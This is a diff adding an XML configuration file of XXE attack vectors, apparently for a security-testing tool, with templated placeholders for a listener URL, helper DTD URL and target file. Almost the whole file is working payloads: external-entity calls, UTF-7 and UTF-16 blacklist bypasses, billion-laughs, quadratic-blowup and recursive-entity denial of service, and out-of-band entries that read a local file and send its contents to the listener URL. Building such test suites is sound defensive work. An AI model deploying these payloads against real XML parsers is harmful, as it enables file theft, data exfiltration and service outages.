@@ -1,0 +1,426 @@
+<configs>
+    <config>
+    <name>Classic XXE Attack (external dtd)</name>
+    <description>The idea of this attack is to force the parser to call arbitrary URLs.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "§tf_listenURL§">
+<data>sometext</data>]]></directMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data PUBLIC "p" "§tf_listenURL§">
+<data>sometext</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>Classic XXE Attack (attribute)</name>
+    <description>The idea of this attack is to force the parser to call arbitrary URLs.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos SYSTEM "§tf_listenURL§" >
+]>
+<data attrib='&dos;'/>]]></directMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos PUBLIC "p" "§tf_listenURL§" >
+]>
+<data attrib='&dos;'/>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>XXE Attack using UTF-16</name>
+    <description>Some simple blacklisting countermeasures can probably bypassed by changing the default XML charset (which is UTF-8), to a different one, for example, UTF-16.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY url SYSTEM "§tf_listenURL§">
+]>
+<data>&url;</data>]]></directMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY url PUBLIC "p" "§tf_listenURL§">
+]>
+<data>&url;</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>XXE Attack using UTF-7</name>
+    <description>Some simple blacklisting countermeasures can probably bypassed by changing the default XML charset (which is UTF-8), to a different one, for example, UTF-7.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-7"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY url SYSTEM "§tf_listenURL§">
+]>
+<data>&url;</data>]]></directMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-7"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY url PUBLIC "p" "§tf_listenURL§">
+]>
+<data>&url;</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>Classic XXE Attack</name>
+    <description>The idea of this attack is to force the parser to call arbitrary URLs.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos SYSTEM "§tf_listenURL§" >
+]>
+<data>&dos;</data>]]></directMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos PUBLIC "p" "§tf_listenURL§" >
+]>
+<data>&dos;</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>Billion Laughs Attack with Parameter Entities</name>
+    <description>This file expands to about 30 KByte but has a total of 11111 entity references and therefore exceeds a reasonable threshold of entity references.</description>
+    <params>
+        <dosbox>true</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>true</helperURL>
+        <attackListenerURL>false</attackListenerURL>
+        <externalResources>true</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<!DOCTYPE data SYSTEM "§tf_helperURL§" [
+<!ELEMENT data (#PCDATA)>
+]>
+<data>&g;</data>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % a0 "dos" >
+<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
+<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
+<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
+<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
+<!ENTITY g  "%a4;">]]></helperMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<!DOCTYPE data PUBLIC "p" "§tf_helperURL§" [
+<!ELEMENT data (#PCDATA)>
+]>
+<data>&g;</data>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % a0 "dos" >
+<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
+<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
+<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
+<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
+<!ENTITY g  "%a4;">]]></helperMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>Billion Laughs Attack</name>
+    <description>This file expands to about 30 KByte but has a total of 11111 entity references and therefore exceeds a reasonable threshold of entity references.</description>
+    <params>
+        <dosbox>true</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>false</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector>
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>Quadratic Blowup Attack</name>
+    <description></description>
+    <params>
+        <dosbox>true</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>false</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector>
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY a0 "dosdosdosdosdosdosdos"
+]>
+<data>&a0;&a0;&a0;&a0;&a0;&a0;</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>Recursive Entities</name>
+    <description></description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>false</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector>
+    <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY a "a&b;" >
+<!ENTITY b "&a;" >
+]>
+<data>&a;</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Bypassing Restrictions of XXE (attribute)</name>
+    <description>This class of attacks vectors is called evolved XXE attacks and is used to (i) bypass restrictions of classic XXE attacks and (ii) for Out-of-Band attacks.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>true</targetFile>
+        <helperURL>true</helperURL>
+        <attackListenerURL>false</attackListenerURL>
+        <externalResources>true</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+]>
+<data attrib='&internal;'/>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;]]></helperMessage>
+    </attackvector>
+    <attackvector type="public" >
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
+%remote;
+]>
+<data attrib='&internal;'/>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p1" "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;]]></helperMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Bypassing Restrictions of XXE</name>
+    <description>This class of attacks vectors is called evolved XXE attacks and is used to (i) bypass restrictions of classic XXE attacks and (ii) for Out-of-Band attacks.</description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>true</targetFile>
+        <helperURL>true</helperURL>
+        <attackListenerURL>false</attackListenerURL>
+        <externalResources>true</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "§tf_targetFILE§">
+<!ENTITY % end "]]]]><![CDATA[>">
+<!ENTITY % dtd SYSTEM "§tf_helperURL§">
+%dtd;
+]>
+<data>&all;</data>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
+    </attackvector>
+    <attackvector type="public" >
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies PUBLIC "p" "§tf_targetFILE§">
+<!ENTITY % end "]]]]><![CDATA[>">
+<!ENTITY % dtd PUBLIC "p1" "§tf_helperURL§">
+%dtd;
+]>
+<data>&all;</data>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Out-of-Band channels (noNamespaceSchemaLocation)</name>
+    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector>
+    <directMessage><![CDATA[<?xml version='1.0'?>
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:noNamespaceSchemaLocation="§tf_listenURL§">4</data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Out-of-Band channels (schemaLocation)</name>
+    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector>
+    <directMessage><![CDATA[ <?xml version='1.0'?>
+<ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:ttt="http://test.com/attack"
+xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Out-of-Band channels (external entity)</name>
+    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>true</targetFile>
+        <helperURL>true</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>true</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "§tf_helperURL§">
+<data>&send;</data>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % file SYSTEM "§tf_targetFILE§">
+<!ENTITY % all "<!ENTITY send SYSTEM '§tf_listenURL§?%file;'>">
+%all;]]></helperMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data PUBLIC "p" "§tf_helperURL§">
+<data>&send;</data>]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % file PUBLIC "p2" "§tf_targetFILE§">
+<!ENTITY % all "<!ENTITY send PUBLIC "p3" '§tf_listenURL§?%file;'>">
+%all;]]></helperMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Out-of-Band channels (external parameter entity)</name>
+    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>true</targetFile>
+        <helperURL>true</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>true</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector type="system" default="true">
+    <directMessage><![CDATA[<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+%send;
+]>
+<data>4</data> ]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM '§tf_listenURL§?%payload;'>">
+%param1;]]></helperMessage>
+    </attackvector>
+    <attackvector type="public">
+    <directMessage><![CDATA[<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
+%remote;
+%send;
+]>
+<data>4</data> ]]></directMessage>
+    <helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p2" "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY &#37; send PUBLIC "p3" '§tf_listenURL§?%payload;'>">
+%param1;]]></helperMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+    <config>
+    <name>FileAccess: Out-of-Band channels (xInclude)</name>
+    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <params>
+        <dosbox>false</dosbox>
+        <targetFile>false</targetFile>
+        <helperURL>false</helperURL>
+        <attackListenerURL>true</attackListenerURL>
+        <externalResources>false</externalResources>
+    </params>
+    <attackvectors>
+    <attackvector>
+    <directMessage><![CDATA[<?xml version='1.0'?>
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="§tf_listenURL§"></xi:include></data>]]></directMessage>
+    </attackvector>
+    </attackvectors>
+    </config>
+</configs>
